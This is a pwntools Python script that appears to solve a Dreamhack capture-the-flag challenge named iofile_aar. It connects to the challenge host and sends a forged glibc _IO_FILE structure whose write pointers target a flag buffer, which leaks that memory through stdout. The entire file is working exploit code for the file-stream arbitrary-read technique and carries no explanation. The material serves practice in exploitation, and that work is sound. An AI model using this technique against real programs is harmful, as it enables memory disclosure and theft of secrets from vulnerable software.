#!/usr/bin/env python3
# Name: iofile_aar.py
from pwn import *
context.log_level = 'debug'
#p = process('./iofile_aar')
p = remote('host3.dreamhack.games', 24224)
elf = ELF('./iofile_aar')
flag_buf = elf.symbols['flag_buf']

#write(STDOUT, flag_buf, sizeof(flag_buf) == 1024)
payload = p64(0xfbad0000 | 0x800)
payload += p64(0) # _IO_read_ptr
payload += p64(flag_buf) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(flag_buf) # _IO_write_base
payload += p64(flag_buf + 1024) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(0) # _IO_buf_base
payload += p64(0) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(1) # stdout
p.sendlineafter(b'Data: ', payload)
p.interactive()